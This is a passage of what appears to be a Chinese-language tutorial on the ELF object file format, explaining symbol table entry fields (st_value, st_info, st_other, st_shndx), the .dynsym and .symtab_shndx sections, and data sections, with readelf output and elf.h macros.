class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -s hash</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">Symbol table &apos;.symtab&apos; contains 68 entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     1: 0000000000400238     0 SECTION LOCAL  DEFAULT    1 </span><br><span class="line">     2: 0000000000400254     0 SECTION LOCAL  DEFAULT    2 </span><br><span class="line">     3: 0000000000400274     0 SECTION LOCAL  DEFAULT    3 </span><br><span class="line">     4: 0000000000400298     0 SECTION LOCAL  DEFAULT    4 </span><br><span class="line">     5: 00000000004002b8     0 SECTION LOCAL  DEFAULT    5 </span><br><span class="line">     6: 0000000000400318     0 SECTION LOCAL  DEFAULT    6 </span><br><span class="line">     7: 0000000000400358     0 SECTION LOCAL  DEFAULT    7 </span><br><span class="line">     8: 0000000000400360     0 SECTION LOCAL  DEFAULT    8 </span><br><span class="line">     9: 0000000000400380     0 SECTION LOCAL  DEFAULT    9 </span><br><span class="line">    10: 0000000000400398     0 SECTION LOCAL  DEFAULT   10 </span><br><span class="line">    11: 00000000004003c8     0 SECTION LOCAL  DEFAULT   11 </span><br><span class="line">    12: 00000000004003f0     0 SECTION LOCAL  DEFAULT   12 </span><br><span class="line">    13: 0000000000400420     0 SECTION LOCAL  DEFAULT   13 </span><br><span class="line">    14: 0000000000400430     0 SECTION LOCAL  DEFAULT   14 </span><br><span class="line">    15: 0000000000400644     0 SECTION LOCAL  DEFAULT   15 </span><br><span class="line">    16: 0000000000400650     0 SECTION LOCAL  DEFAULT   16 </span><br><span class="line">    17: 0000000000400658     0 SECTION LOCAL  DEFAULT   17 </span><br><span class="line">    18: 0000000000400698     0 SECTION LOCAL  DEFAULT   18 </span><br><span class="line">    19: 0000000000600e10     0 SECTION LOCAL  DEFAULT   19 </span><br><span class="line">    20: 0000000000600e18     0 SECTION LOCAL  DEFAULT   20 </span><br><span class="line">    21: 0000000000600e20     0 SECTION LOCAL  DEFAULT   21 </span><br><span class="line">    22: 0000000000600e28     0 SECTION LOCAL  DEFAULT   22 </span><br><span class="line">    23: 0000000000600ff8     0 SECTION LOCAL  DEFAULT   23 </span><br><span class="line">    24: 0000000000601000     0 SECTION LOCAL  DEFAULT   24 </span><br><span class="line">    25: 0000000000601028     0 SECTION LOCAL  DEFAULT   25 </span><br><span class="line">    26: 0000000000601038     0 SECTION LOCAL  DEFAULT   26 </span><br><span class="line">    27: 0000000000000000     0 SECTION LOCAL  DEFAULT   27 </span><br><span class="line">    28: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">    29: 0000000000600e20     0 OBJECT  LOCAL  DEFAULT   21 __JCR_LIST__</span><br><span class="line">    30: 0000000000400460     0 FUNC    LOCAL  DEFAULT   14 deregister_tm_clones</span><br><span class="line">    31: 00000000004004a0     0 FUNC    LOCAL  DEFAULT   14 register_tm_clones</span><br><span class="line">    32: 00000000004004e0     0 FUNC    LOCAL  DEFAULT   14 __do_global_dtors_aux</span><br><span class="line">    33: 0000000000601038     1 OBJECT  LOCAL  DEFAULT   26 completed.7594</span><br><span class="line">    34: 0000000000600e18     0 OBJECT  LOCAL  DEFAULT   20 __do_global_dtors_aux_fin</span><br><span class="line">    35: 0000000000400500     0 FUNC    LOCAL  DEFAULT   14 frame_dummy</span><br><span class="line">    36: 0000000000600e10     0 OBJECT  LOCAL  DEFAULT   19 __frame_dummy_init_array_</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><h5 id="5-5-1-1-st-value"><a href="#5-5-1-1-st-value" class="headerlink" title="5.5.1.1 st_value"></a>5.5.1.1 st_value</h5><p>不同目标文件类型的符号表条目对st_value成员的解释略有不同。</p><ul><li>在可重定位文件中，st_value保存节索引为SHN_COMMON的符号的对齐约束。</li><li>在可重定位文件中，st_value保存已定义符号的节偏移量。也就是说，st_value是从st_shndx标识的节的开头的偏移量。</li><li>在可执行文件和共享目标文件中，st_value保存一个虚拟地址。为了使这些文件的符号对动态链接器(Dynamic Linker)更有用，节偏移量(文件层面解释)让位于与节号无关的虚拟地址(内存层面解释)。</li></ul><p>&emsp;&emsp;尽管st_value对于不同的目标文件具有相似的含义，但允许适当的程序高效地访问这些数据。</p><p>&emsp;&emsp;如果可执行文件中包含对与其相关联的共享对象中定义的函数的引用，则该文件的符号表节将包含该符号的条目。该符号表条目的st_shndx成员将包含SHN_UNDEF。这向动态链接器(Dynamic Linker)发出信号，该函数的符号定义不包含在可执行文件本身中。如果该符号已在可执行文件中分配了一个过程链接表(Procedure Linkage Table)条目，并且该符号表条目的st_value成员不为零，则该值将包含该过程链接表条目的第一条指令的虚拟地址。否则，st_value成员为0。动态链接器(Dynamic Linker)在解析对函数地址的引用时使用此过程链接表表项的地址。</p><p>在Linux的ELF文件中，具体说明如下：</p><p>1、该符号对应着一个变量，那么st_value的值为该变量在内存中的偏移。我们可由这个值获取其文件偏移。</p><ul><li>a. 获取该符号对应的st_shndx，进而获取到相关的节。</li><li>b. 根据节头成员可以获取节的内存基地址和文件基地址。</li><li>c. st_value - 内存基地址 = 文件偏移 - 文件基地址</li></ul><p>2、该符号对应着一个函数，那么st_value的值为该函数在文件中的偏移。</p><p>&emsp;&emsp;可执行文件和与其关联的共享目标文件对函数地址的引用可能不会解析为相同的值。来自共享目标文件的引用通常由动态链接器(Dynamic Linker)解析为函数本身的虚拟地址。可执行文件中对共享目标文件中定义的函数的引用通常由链接器(Link Editor)解析为可执行文件中该函数的过程链接表(Procedure Linkage Table)条目的地址。</p><p>&emsp;&emsp;为了允许函数地址的比较按预期工作，如果可执行文件引用共享目标文件中定义的函数，链接器将把该函数的过程链接表(Procedure Linkage Table)条目的地址放置在其关联的符号表条目中。动态链接器(Dynamic Linker)会特别对待此类符号表条目。如果动态链接器正在搜索一个符号，并且在可执行文件中遇到该符号的符号表条目，则它通常遵循规则如下：</p><ul><li>1、如果符号表条目的st_shndx成员不是SHN_UNDEF，则动态链接器(Dynamic Linker)已找到该符号的定义，并将其的st_value成员用作该符号的地址。</li><li>2、如果st_shndx成员是SHN_UNDEF，并且符号是STT_FUNC类型，并且st_value成员不为0，则动态链接器(Dynamic Linker)会将此条目识别为特殊项，并使用st_value成员作为符号的地址。</li><li>3、否则，动态链接器(Dynamic Linker)认为该符号在可执行文件中未定义并继续处理。</li></ul><h5 id="5-5-1-2-st-info"><a href="#5-5-1-2-st-info" class="headerlink" title="5.5.1.2 st_info"></a>5.5.1.2 st_info</h5><p>&emsp;&emsp;st_info指定符号类型及绑定属性。st_info的低4位表示符号类型，高4位表示绑定属性。符号类型的宏定义以STT开头，符号绑定的宏定义以STB开头。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* st_info字段中符号类型和绑定属性的提取 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_BIND(val) (((unsigned char) (val)) &gt;&gt; 4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_TYPE(val) ((val) &amp; 0xf)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_INFO(bind, type) (((bind) &lt;&lt; 4) + ((type) &amp; 0xf))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Elf32_Sym和Elf64_Sym都使用相同的一字节的st_info字段 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_ST_BIND(val) ELF32_ST_BIND (val)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_ST_TYPE(val) ELF32_ST_TYPE (val)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_ST_INFO(bind, type) ELF32_ST_INFO ((bind), (type))</span></span><br></pre></td></tr></table></figure><h6 id="5-5-1-2-1-Symbol-Type"><a href="#5-5-1-2-1-Symbol-Type" class="headerlink" title="5.5.1.2.1 Symbol Type"></a>5.5.1.2.1 Symbol Type</h6><p>下面是一些合法的符号类型：</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 5-11：Symbol Types</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:left">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">STT_NOTYPE</td><td style="text-align:left">0</td><td style="text-align:left">未指定符号的类型。</td></tr><tr><td style="text-align:left">STT_OBJECT</td><td style="text-align:left">1</td><td style="text-align:left">该符号与数据对象相关联，如变量、数组等。</td></tr><tr><td style="text-align:left">STT_FUNC</td><td style="text-align:left">2</td><td style="text-align:left">该符号与一个函数或其他可执行代码相关联。</td></tr><tr><td style="text-align:left">STT_SECTION</td><td style="text-align:left">3</td><td style="text-align:left">该符号与一个节相关联。这种类型的符号表表项主要是为了重定位而存在的，通常具有STB_LOCAL绑定。</td></tr><tr><td style="text-align:left">STT_FILE</td><td style="text-align:left">4</td><td style="text-align:left">通常，符号的名称给出与目标文件相关联的源文件的名称。一个文件符号具有STB_LOCAL绑定，它的节索引是SHN_ABS，如果存在的话，它在文件的其他STB_LOCAL符号之前。节类型为SHT_SYMTAB的符号表(.symtab)的索引1的符号项表示目标文件的STT_FILE符号。通常，此符号跟在STT_SECTION符号之后，然后是已简化(Reduced)为局部符号的任何全局符号。</td></tr><tr><td style="text-align:left">STT_COMMON</td><td style="text-align:left">5</td><td style="text-align:left">该符号标记一个未初始化的公共块(Common Block)。这个符号和STT_OBJECT完全一样。</td></tr><tr><td style="text-align:left">STT_TLS</td><td style="text-align:left">6</td><td style="text-align:left">该符号是线程本地数据对象。定义后，该符号给出了符号的分配偏移量，而不是实际地址。对于可分配的节，类型为STT_TLS的符号只能由特殊的线程本地存储重定位引用。线程本地存储重定位只能引用STT_TLS类型的符号，或者引用的节具有SHF_TLS标志和STT_SECTION类型的符号。从不可分配节对STT_TLS类型符号的引用没有此限制。</td></tr><tr><td style="text-align:left">STT_NUM</td><td style="text-align:left">7</td><td style="text-align:left">定义类型的数量。</td></tr><tr><td style="text-align:left">STT_LOOS</td><td style="text-align:left">10</td><td style="text-align:left">保留用于特定操作系统语义符号类型值范围的下限。</td></tr><tr><td style="text-align:left">STT_GNU_IFUNC</td><td style="text-align:left">10</td><td style="text-align:left">该符号是间接的代码对象。</td></tr><tr><td style="text-align:left">STT_HIOS</td><td style="text-align:left">12</td><td style="text-align:left">保留用于特定操作系统语义符号类型值范围的上限。</td></tr><tr><td style="text-align:left">STT_LOPROC</td><td style="text-align:left">13</td><td style="text-align:left">保留用于特定处理器语义符号类型值范围的下限。</td></tr><tr><td style="text-align:left">STT_HIPROC</td><td style="text-align:left">15</td><td style="text-align:left">保留用于特定处理器语义符号类型值范围的上限。</td></tr></tbody></table><p>&emsp;&emsp;共享目标文件中的函数符号(类型为STT_FUNC的符号)具有特殊意义。当另一个目标文件从共享目标文件引用一个函数时，链接器(Link Editor)会自动为被引用的符号创建一个过程链接表(Procedure Linkage Table)条目。目标文件不会通过过程链接表(Procedure Linkage Table)自动引用类型不是STT_FUNC的其它共享目标符号。</p><h6 id="5-5-1-2-2-Symbol-Binding"><a href="#5-5-1-2-2-Symbol-Binding" class="headerlink" title="5.5.1.2.2 Symbol Binding"></a>5.5.1.2.2 Symbol Binding</h6><p>&emsp;&emsp;符号的绑定决定了符号的链接可见性(Linkage Visibility)和行为(Behavior)。</p><p>下面是一些合法的符号绑定：</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 5-12：Symbol Binding</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:left">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">STB_LOCAL</td><td style="text-align:left">0</td><td style="text-align:left">局部符号。这种符号在包含其定义的目标文件之外不可见。同名的局部符号可以存在于多个文件中，互不干扰。</td></tr><tr><td style="text-align:left">STB_GLOBAL</td><td style="text-align:left">1</td><td style="text-align:left">全局符号。这种符号对所有被合并的目标文件都是可见的。一个文件对全局符号的定义将满足另一个文件对同一全局符号的未定义引用。</td></tr><tr><td style="text-align:left">STB_WEAK</td><td style="text-align:left">2</td><td style="text-align:left">弱符号。这种符号类似于全局符号，但它们的定义具有较低的优先级。</td></tr><tr><td style="text-align:left">STB_NUM</td><td style="text-align:left">3</td><td style="text-align:left">定义的类型的数量。</td></tr><tr><td style="text-align:left">STB_LOOS</td><td style="text-align:left">10</td><td style="text-align:left">保留用于特定操作系统语义绑定类型值范围的下限。</td></tr><tr><td style="text-align:left">STB_HIOS</td><td style="text-align:left">12</td><td style="text-align:left">保留用于特定操作系统语义绑定类型值范围的上限。</td></tr><tr><td style="text-align:left">STB_LOPROC</td><td style="text-align:left">13</td><td style="text-align:left">保留用于特定处理器语义绑定类型值范围的下限。</td></tr><tr><td style="text-align:left">STB_HIPROC</td><td style="text-align:left">15</td><td style="text-align:left">保留用于特定处理器语义绑定类型值范围的上限。</td></tr></tbody></table><p>&emsp;&emsp;在每个符号表中，所有带有STB_LOCAL绑定的符号都位于弱符号和全局符号之前。符号的类型为关联的实体提供了一般的分类。符号表节(Symbol Table Section)的节头成员sh_info保存着符号表中第一个非局部符号的符号表索引。</p><p>全局符号和弱符号在两个主要方面有所不同：</p><ul><li>当链接器(Link Editor)链接多个可重定位目标文件时，它不允许定义多个具有相同名称的STB_GLOBAL符号。另一方面，如果存在一个已定义的全局符号，则同名弱符号的存在不会导致错误。链接器(Link Editor)会优先选择全局符号定义，忽略弱符号定义。类似的，如果存在公共符号(即st_shndx字段为SHN_COMMON的符号)，同名弱符号的出现也不会导致错误。链接器(Link Editor)会优先选择公共符号(Common Symbol)定义，忽略弱符号定义。</li><li>当链接器(Link Editor)搜索静态库(Archive Libraries)时，它将提取包含未定义的(Undefined)和暂定的(Tentative)全局符号定义的归档成员。成员的定义可以是全局符号或弱符号。默认情况下，链接器(Link Editor)不会提取归档成员来解析未定义的弱符号。未解析的弱符号具有0值。使用“-z weakextract”会覆盖此默认行为。此选项允许链接器(Link Editor)提取归档成员来解析未定义的弱符号。</li></ul><blockquote><p>注：弱符号主要用于系统软件。不鼓励在应用程序中使用它们。</p></blockquote><h5 id="5-5-1-3-st-other"><a href="#5-5-1-3-st-other" class="headerlink" title="5.5.1.3 st_other"></a>5.5.1.3 st_other</h5><p>&emsp;&emsp;该成员定义了符号的可见性(Visibility)。下面的代码展示了如何操作32位对象和64位对象的st_other的值。其他位设置为零，因为其不包含任何含义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* How to extract and insert information held in the st_other field. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_VISIBILITY(o)((o) &amp; 0x03)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* For ELF64 the definitions are the same. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_ST_VISIBILITY(o)ELF32_ST_VISIBILITY (o)</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;可以在可重定位对象中指定此可见性。此可见性定义了该符号成为动态对象的一部分后如何访问该符号。</p><p>下面是一些合法的符号可见性：</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 5-13：ELF Symbol Visibility</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:left">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">STV_DEFAULT</td><td style="text-align:left">0</td><td style="text-align:left">具有STV_DEFAULT属性的符号的可见性由符号的绑定类型指定。全局符号和弱符号在定义它们的动态对象之外可见。局部符号被隐藏。全局符号和弱符号也可以被抢占(Preempted)。这些符号可以通过另一个组件中的同名定义插入。</td></tr><tr><td style="text-align:left">STV_INTERNAL</td><td style="text-align:left">1</td><td style="text-align:left">这个可见性属性的解释与STV_HIDDEN相同。</td></tr><tr><td style="text-align:left">STV_HIDDEN</td><td style="text-align:left">2</td><td style="text-align:left">如果当前组件中定义的符号名称对其他组件不可见，则该符号将隐藏。这样的符号必然受到保护。该属性用于控制组件的外部接口。由这样的符号命名的对象如果其地址被传递到外部，仍然可以被另一个组件引用。当对象包含在动态对象中时，可重定位对象中包含的隐藏符号将被删除或转换为STB_LOCAL绑定。</td></tr><tr><td style="text-align:left">STV_PROTECTED</td><td style="text-align:left">3</td><td style="text-align:left">如果当前组件中定义的符号在其他组件中可见，则该符号将受到保护，但不能被抢占(Preempted)。在定义组件中对此类符号的任何引用都必须解析为该组件中的定义。即使符号定义存在于由默认规则插入(Interpose)的另一个组件中，也必须进行此解析。具有STB_LOCAL绑定的符号将不具有STV_PROTECTED可见性。</td></tr><tr><td style="text-align:left">STV_EXPORTED</td><td style="text-align:left">4</td><td style="text-align:left">此可见性属性可确保符号保持全局性。这种可见性不能被任何其他符号可见性技术降级(Demoted)或消除(Eliminated)。具有STB_LOCAL绑定的符号将不具有STV_EXPORTED可见性。</td></tr><tr><td style="text-align:left">STV_SINGLETON</td><td style="text-align:left">5</td><td style="text-align:left">此可见性属性确保符号保持全局性，并且符号定义的单个实例绑定到进程内的所有引用。这种可见性不能被任何其他符号可见性技术(Demoted)或消除(Eliminated)。具有STB_LOCAL绑定的符号将不具有STV_SINGLETON可见性。不能直接绑定到STV_SINGLETON。</td></tr><tr><td style="text-align:left">STV_ELIMINATE</td><td style="text-align:left">6</td><td style="text-align:left">此可见性属性扩展STV_HIDDEN。在当前组件中定义为消除(Eliminate)的符号对其他组件不可见。该符号不会写入使用该组件的动态对象的任何符号表中。</td></tr></tbody></table><p>&emsp;&emsp;STV_SINGLETON可见性属性会影响链接(Link-Editing)期间可执行文件或共享目标文件中的符号解析。一个进程中的任何引用只能绑定到一个单独的(Singleton)实例。</p><p>&emsp;&emsp;STV_SINGLETON可以与STV_DEFAULT可见性属性结合使用，STV_SINGLETON优先。STV_EXPORT可以与STV_DEFAULT可见性属性结合使用，STV_EXPORT优先。STV_SINGLETON或STV_EXPORT可见性不能与任何其他可见性属性结合使用。这样的事件对于链接(Link-Edit)来说是致命(Fatal)的。</p><p>&emsp;&emsp;在链接(Link-Editing)期间，其他可见性属性不会影响动态对象内符号的解析。这种解析由绑定类型控制。一旦链接器选择了它的解析，这些属性就强加了两个要求。这两个要求都基于这样一个事实，即被链接的代码中的引用可能已经过优化以利用这些属性。</p><ul><li>所有非默认可见性属性，当应用于符号引用时，意味着必须在被链接的对象中提供满足该引用的定义。如果这种类型的符号引用在被链接的对象中没有定义，则该引用必须具有STB_WEAK绑定。在这种情况下，该引用被解析为0。</li><li>如果对名称的任何引用或名称的定义是具有非默认可见性属性的符号，则可见性属性将被传递(Propagated)到正在链接的对象中的解析符号。如果为符号的不同实例指定了不同的可见性属性，则将约束(Constraining)最大的可见性属性传递到正在链接的对象中的解析符号。这些属性，从约束最少到最多排序，是STV_PROTECTED、STV_HIDDEN和 STV_INTERNAL。</li></ul><h5 id="5-5-1-4-st-shndx"><a href="#5-5-1-4-st-shndx" class="headerlink" title="5.5.1.4 st_shndx"></a>5.5.1.4 st_shndx</h5><p>&emsp;&emsp;如果一个符号的值指向一个节中的特定位置，它的节索引成员st_shndx将保存一个节头表表项的索引。随着在重定位期间节的移动，符号的值也会发生变化，并且对符号的引用继续“指向”程序中的同一位置。一些特殊的节索引值给出了其他语义。</p><p>&emsp;&emsp;ELF目标文件中的符号向链接器(Linker)和加载器(Loader)传达特定信息。</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 5-14：Special Section Index of Symbol</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:left">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">SHN_UNDEF</td><td style="text-align:left">0</td><td style="text-align:left">此节索引表示符号未定义(在此目标文件中未定义，可能在其他目标文件中)。当链接器(Link Editor)将此目标文件与另一个定义指定符号的目标文件组合在一起时，此目标文件对符号的引用将被链接到实际定义。</td></tr><tr><td style="text-align:left">SHN_ABS</td><td style="text-align:left">0xFFF1</td><td style="text-align:left">符号具有绝对值，不会因重定位而改变。</td></tr><tr><td style="text-align:left">SHN_COMMON</td><td style="text-align:left">0xFFF2</td><td style="text-align:left">该符号标记尚未分配的公共块(Common Block)。符号的值给出了对齐约束(Alignment Constraints)，类似于节头的sh_addralign成员。也就是说，链接器(Link Editor)将在st_value倍数的地址上为符号分配存储空间。st_size表明需要多少字节。</td></tr></tbody></table><p>&emsp;&emsp;如果此成员包含SHN_XINDEX，则实际的节头表索引太大而无法放入此字段。实际值包含在类型为SHT_SYMTAB_SHNDX的相关节中。</p><h4 id="5-5-2-symtab-shndx"><a href="#5-5-2-symtab-shndx" class="headerlink" title="5.5.2 .symtab_shndx"></a>5.5.2 .symtab_shndx</h4><p>&emsp;&emsp;当符号表表项Elfxx_Sym的成员st_shndx包含SHN_XINDEX(0xFFFF)时，表示实际的节头表索引太大而无法放入st_shndx字段。实际值保存在.symtab_shndx节中。本节属于SHT_SYMTAB_SHNDX类型。</p><p>&emsp;&emsp;此节保存特殊符号表节索引数组，如.symtab所述。如果关联的符号表节包含SHF_ALLOC位，则该节的属性也包括SHF_ALLOC位。否则，不包括。</p><h4 id="5-5-3-dynsym"><a href="#5-5-3-dynsym" class="headerlink" title="5.5.3 .dynsym"></a>5.5.3 .dynsym</h4><p>&emsp;&emsp;本节保存动态链接符号表，与.symtab的结构相同，包含.symtab表中支持动态链接所需的符号的子集。此节属于SHT_DYNSYM类型。使用的属性是SHF_ALLOC。因此这个符号表在进程执行期间会占用内存，可以在进程的内存映像中使用。</p><p>&emsp;&emsp;.dynsym表以标准的Null符号开始，然后是文件的全局符号。STT_FILE符号通常不会出现在这个符号表中。如果重定位表项需要STT_SECTION符号，则可能会出现。</p><p>&emsp;&emsp;需要注意的是.dynsym表的内容是运行时所需的，ELF文件中export/import的符号信息全在这里。但是，.symtab节中存储的信息是编译时的符号信息，它们在strip之后会被删除掉。</p><p>我们主要关注动态符号表表项中的两个成员：</p><ul><li>st_name，该成员保存着动态符号在.dynstr表(动态字符串表)中的偏移。</li><li>st_value，如果这个符号被导出，这个符号保存着对应的虚拟地址。</li></ul><p>&emsp;&emsp;我们可以使用readelf对.dynsym表的内容进行查看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -s libc-2.23.so</span><br><span class="line"></span><br><span class="line">Symbol table &apos;.dynsym&apos; contains 2415 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     1: 00000000     0 OBJECT  GLOBAL DEFAULT  UND __libc_stack_end@GLIBC_2.1 (36)</span><br><span class="line">     2: 00000000     0 OBJECT  GLOBAL DEFAULT  UND _rtld_global@GLIBC_PRIVATE (37)</span><br><span class="line">     3: 00000000     0 OBJECT  GLOBAL DEFAULT  UND __libc_enable_secure@GLIBC_PRIVATE (37)</span><br><span class="line">     4: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _IO_stdin_used</span><br><span class="line">     5: 00000000     0 OBJECT  GLOBAL DEFAULT  UND _rtld_global_ro@GLIBC_PRIVATE (37)</span><br><span class="line">     6: 00000000     0 FUNC    GLOBAL DEFAULT  UND _dl_find_dso_for_object@GLIBC_PRIVATE (37)</span><br><span class="line">     7: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _dl_starting_up</span><br><span class="line">     8: 00000000     0 FUNC    GLOBAL DEFAULT  UND ___tls_get_addr@GLIBC_2.3 (38)</span><br><span class="line">     9: 00000000     0 OBJECT  GLOBAL DEFAULT  UND _dl_argv@GLIBC_PRIVATE (37)</span><br><span class="line">    10: 000617b0   299 FUNC    GLOBAL DEFAULT   13 putwchar@@GLIBC_2.2</span><br><span class="line">    11: 0007dea0    37 FUNC    GLOBAL DEFAULT   13 __strspn_c1@@GLIBC_2.1.1</span><br><span class="line">    12: 000f6f40    48 FUNC    GLOBAL DEFAULT   13 __gethostname_chk@@GLIBC_2.4</span><br><span class="line">    13: 0007ded0    54 FUNC    GLOBAL DEFAULT   13 __strspn_c2@@GLIBC_2.1.1</span><br><span class="line">    14: 0010d4e0   163 FUNC    GLOBAL DEFAULT   13 setrpcent@@GLIBC_2.0</span><br><span class="line">    15: 00096ac0    39 FUNC    GLOBAL DEFAULT   13 __wcstod_l@@GLIBC_2.1</span><br><span class="line">    16: 0007df10    84 FUNC    GLOBAL DEFAULT   13 __strspn_c3@@GLIBC_2.1.1</span><br><span class="line">[...]</span><br><span class="line">  2408: 000f34c0    65 FUNC    GLOBAL DEFAULT   13 pthread_attr_getinheritsc@@GLIBC_2.0</span><br><span class="line">  2409: 000f5f90    56 FUNC    GLOBAL DEFAULT   13 __readlinkat_chk@@GLIBC_2.5</span><br><span class="line">  2410: 00107920   122 FUNC    GLOBAL DEFAULT   13 __nss_hosts_lookup2@@GLIBC_PRIVATE</span><br><span class="line">  2411: 00111f60   119 FUNC    GLOBAL DEFAULT   13 key_decryptsession@@GLIBC_2.1</span><br><span class="line">  2412: 000e4b80   297 FUNC    GLOBAL DEFAULT   13 vwarn@@GLIBC_2.0</span><br><span class="line">  2413: 000dc740   282 FUNC    GLOBAL DEFAULT   13 fts64_close@@GLIBC_2.23</span><br><span class="line">  2414: 00091280    46 FUNC    WEAK   DEFAULT   13 wcpcpy@@GLIBC_2.0</span><br></pre></td></tr></table></figure><h5 id="5-5-3-1-符号版本"><a href="#5-5-3-1-符号版本" class="headerlink" title="5.5.3.1 符号版本"></a>5.5.3.1 符号版本</h5><p>&emsp;&emsp;动态符号的版本信息保存在.gnu.version节中，该节(Section)应与.dynsym节中的动态符号表(Dynamic Symbol Table)具有相同数量的条目，并且一一对应。其是由Elfxx_Versym结构构成的数组，每个数组元素是一个16位的整数，这个整数是由Elfxx_Vernaux结构的vna_other成员或Elfxx_Verdef结构的vd_ndx成员提供的符号版本标识符，一个索引。</p><p>&emsp;&emsp;在这样的情况下，动态链接器使用从Elfxx_Rel结构体的成员r_info中获得的下标同时作为.dynsym节和.gnu.version节的下标。这样就可以一一对应到每一个符号到底是那个版本的了。</p><h3 id="5-7-Data-Related-Sections"><a href="#5-7-Data-Related-Sections" class="headerlink" title="5.7 Data Related Sections"></a>5.7 Data Related Sections</h3><h4 id="5-7-1-bss"><a href="#5-7-1-bss" class="headerlink" title="5.7.1 .bss"></a>5.7.1 .bss</h4><p>&emsp;&emsp;此节保存未初始化的数据(全局变量)，占用程序内存映像空间，但不占用ELF文件空间。根据定义，当程序开始运行时，系统将这些数据初始化为0，在程序执行期间可以进行赋值。由于.bss节未保存实际的数据，因此此节属于SHT_NOBITS类型。属性类型为SHF_ALLOC和SHF_WRITE。</p><h4 id="5-7-2-tbss"><a href="#5-7-2-tbss" class="headerlink" title="5.7.2 .tbss"></a>5.7.2 .tbss</h4><p>&emsp;&emsp;此节保存未初始化的线程本地数据，占用程序内存映像空间，但不占用ELF文件空间。根据定义，当为每个新执行流实例化数据时，系统将这些数据初始化为0，在程序执行期间可以进行赋值。由于.tbss节未保存实际的数据，因此此节属于SHT_NOBITS类型。属性类型为SHF_ALLOC、SHF_WRITE和SHF_TLS。</p><h4 id="5-7-3-data-amp-data1"><a href="#5-7-3-data-amp-data1" class="headerlink" title="5.7.3 .data &amp; .data1"></a>5.7.3 .data &amp; .data1</h4><p>&emsp;&emsp;这些节保存初始化的数据(全局变量)，占用程序内存映像空间，也占用ELF文件空间。由于其保存了程序的变量数据，因此这些节属于SHT_PROGBITS类型。属性类型为SHF_ALLOC和SHF_WRITE。</p><h4 id="5-7-4-tdata-amp-tdata1"><a href="#5-7-4-tdata-amp-tdata1" class="headerlink" title="5.7.4 .tdata &amp; .tdata1"></a>5.7.4 .tdata &amp; .tdata1</h4><p>&emsp;&emsp;这些节保存初始化的线程本地数据，占用程序内存映像空间，也占用ELF文件空间。系统为每个新的执行流都实例化其内容的一个副本。由于其保存了程序的变量数据，因此这些节属于SHT_PROGBITS类型。属性类型为SHF_ALLOC、SHF_WRITE和SHF_TLS。</p><h4 id="5-7-5-rodata-amp-rodata1"><a href="#5-7-5-rodata-amp-rodata1" class="headerlink" title="5.7.5 .rodata &amp; .rodata1"></a>5.7.5 .rodata &amp; .rodata1</h4><p>&emsp;&emsp;这些节保存只读数据，这些数据通常会在进程内存映像中形成不可写的段(Segment)。这些节属于SHT_PROGBITS类型。使用的属性是SHF_ALLOC。</p><h3 id="5-8-Common-Code-Section-6"><a href="#5-8-Common-Code-Section-6" class="headerlink" title="5.8 Common Code Section[^6]"></a>5.8 Common Code 